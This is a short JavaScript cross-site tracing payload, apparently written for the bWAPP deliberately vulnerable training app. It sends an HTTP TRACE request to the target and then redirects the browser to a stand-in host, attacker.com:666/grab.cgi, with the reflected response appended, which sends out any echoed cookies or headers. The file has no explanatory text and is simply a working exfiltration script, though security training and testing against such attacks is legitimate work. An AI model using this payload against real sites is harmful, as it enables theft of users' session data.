var xmlhttp;	
// Code for IE7+, Firefox, Chrome, Opera, Safari
if (window.XMLHttpRequest)
{
	xmlhttp=new XMLHttpRequest();
}
// Code for IE6, IE5	
else
{ 
	xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
}	
xmlhttp.onreadystatechange=function()
{	
	if (xmlhttp.readyState==4 && xmlhttp.status==200)
	{		
		xmlResp=xmlhttp.responseText;
		// document.getElementById("response").innerHTML=xmlResp
		alert(xmlResp);
		document.location="http://attacker.com:666/grab.cgi?"+xmlResp;
	}
}
xmlhttp.open("TRACE","http://itsecgames.com/bWAPP/",true);
// xmlhttp.withCredentials = true;
xmlhttp.send();